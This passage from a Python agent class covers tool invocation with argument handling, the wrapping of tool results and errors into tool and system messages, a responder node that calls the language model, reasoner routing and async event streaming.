                        # Use ainvoke with the extracted command
                        result = await matching_tool.ainvoke(command)
                    else:
                        # For other tools, execute with standard arguments
                        # Make sure we handle cases where the tool might be expecting a specific argument name
                        if isinstance(tool_args, dict):
                            # If this is a properly formatted dict with expected argument names, use it directly
                            if not (len(tool_args) == 1 and 'self' in tool_args):
                                result = await matching_tool.ainvoke(tool_args)
                            # If it's a dict with just 'self', extract that value
                            elif isinstance(tool_args['self'], str):
                                result = await matching_tool.ainvoke(tool_args['self'])
                            else:
                                result = await matching_tool.ainvoke({})
                        elif isinstance(tool_args, str):
                            # If it's just a string, pass it directly
                            result = await matching_tool.ainvoke(tool_args)
                        else:
                            # Otherwise, convert to string
                            result = await matching_tool.ainvoke(str(tool_args))

                    # Convert result to a tool message
                    tool_message = ToolMessage(
                        content=result,
                        name=tool_name,
                        tool_call_id=tool_call.get('id', '')
                    )

                    # Also create a system message version for the agent to understand
                    system_msg = SystemMessage(content=f"Tool result from {tool_name}: {result}")

                    # Add both messages to preserved messages
                    preserved_messages.append(system_msg)
                    preserved_messages.append(tool_message)

                    print(f"[Agent] Tool {tool_name} completed with result: {str(result)[:100]}...")

                except Exception as e:
                    error_msg = f"Error executing tool {tool_name}: {str(e)}"
                    print(f"[Agent] {error_msg}")
                    import traceback
                    traceback.print_exc()

                    # Create error messages
                    error_tool_message = ToolMessage(
                        content=error_msg,
                        name=tool_name,
                        tool_call_id=tool_call.get('id', '')
                    )
                    error_system_msg = SystemMessage(content=f"Tool error from {tool_name}: {error_msg}")

                    # Add error messages
                    preserved_messages.append(error_system_msg)
                    preserved_messages.append(error_tool_message)
            else:
                error_msg = f"Tool {tool_name} not found"
                print(f"[Agent] {error_msg}")

                # Create not found messages
                not_found_tool_message = ToolMessage(
                    content=error_msg,
                    name=tool_name,
                    tool_call_id=tool_call.get('id', '')
                )
                not_found_system_msg = SystemMessage(content=f"Tool error: {error_msg}")

                # Add not found messages
                preserved_messages.append(not_found_system_msg)
                preserved_messages.append(not_found_tool_message)

        # Update the state with preserved messages
        return {**state, "messages": preserved_messages}

    async def responder(self, state: MessagesState):
        """
        Generate the final response to the user.

        Args:
            state (dict): Current state with reasoning results

        Returns:
            dict: Updated state with the final response
        """
        print("[Agent] Entering responder node")

        # Flush any remaining thinking content from the reasoner
        await self.streaming_handler._flush_thinking_buffer()

        # Use chat output target for responder - this will show in chat history
        self.streaming_handler.output_target = "chat"

        try:
            # Filter messages for the responder
            # Include the original user query and system messages (including our converted tool results)
            filtered_messages = []
            human_message = None
            for msg in state["messages"]:
                if isinstance(msg, HumanMessage):
                    # Keep track of the original human message
                    human_message = msg
                    filtered_messages.append(msg)
                elif isinstance(msg, SystemMessage):
                    filtered_messages.append(msg)
                elif getattr(msg, "type", "") == "human":
                    human_message = msg
                    filtered_messages.append(msg)
                elif getattr(msg, "type", "") == "system":
                    filtered_messages.append(msg)

            # Ensure we have the human message
            if not human_message and len(state["messages"]) > 0:
                # Try to find the first human message in the original state
                for msg in state["messages"]:
                    if isinstance(msg, HumanMessage) or getattr(msg, "type", "") == "human":
                        human_message = msg
                        if human_message not in filtered_messages:
                            filtered_messages.append(human_message)
                        break

            # Add the response prompt
            messages_to_send = [self.response_prompt] + filtered_messages

            # Log what we're sending to the responder
            print(f"[Agent] Responder sending {len(messages_to_send)} messages")
            for i, msg in enumerate(messages_to_send):
                content = getattr(msg, "content", "")
                print(f"[Agent] Message {i}: {type(msg).__name__} - {content[:50]}...")

            # Generate the final response
            result = await self.llm.ainvoke(
                messages_to_send,
                config={"callbacks": [self.streaming_handler]}
            )

            # No need to manually send events - callback handles it
            new_messages = state["messages"] + [result]
            return {**state, "messages": new_messages}

        except Exception as e:
            print(f"[Agent] Error in responder: {str(e)}")
            # Since this is the last node, output error to chat
            await self.streaming_handler.queue.put({
                "type": "token",
                "value": f"I apologize, but I encountered an error while processing your request. Please try again."
            })
            return state

    def route_from_reasoner(self, state):
        """
        Determine the next step after reasoning.

        Args:
            state (dict): Current state

        Returns:
            str: Next node to execute ("tools" or "responder")
        """
        print(f"[Agent] Routing from reasoner. Done: {state.get('done')}")

        # If there was an error or we're explicitly done, go to responder
        if state.get('done', False):
            return "responder"

        # Check if the last message contains tool calls
        last_message = state["messages"][-1] if state["messages"] else None
        has_tool_calls = hasattr(last_message, "tool_calls") and last_message.tool_calls

        if has_tool_calls:
            return "tools"  # Process tool calls
        else:
            # No tool calls but not done yet - go to responder as fallback
            return "responder"

    async def run_agent_streaming(self, prompt: str):
        """
        Run the agent with streaming output.

        Args:
            prompt (str): The user's prompt/query

        Yields:
            dict: Event objects for streaming (tokens, thinking, tool calls, etc.)
        """
        input_messages = [HumanMessage(content=prompt)]

        # Initialize streaming handler
        self.streaming_handler = StreamingHandler(output_target="debug")

        # Build the agent graph
        self._build_agent_graph()

        async def run_graph():
            print("[Agent] Starting graph execution")
            await self.react_graph.ainvoke(
                {"messages": input_messages},
                config={"callbacks": [self.streaming_handler]}
            )
            await self.streaming_handler.end()
            print("[Agent] Graph execution complete")

        graph_task = asyncio.create_task(run_graph())

        try:
            async for event in self.streaming_handler.stream():
                yield event
        finally:
            await graph_task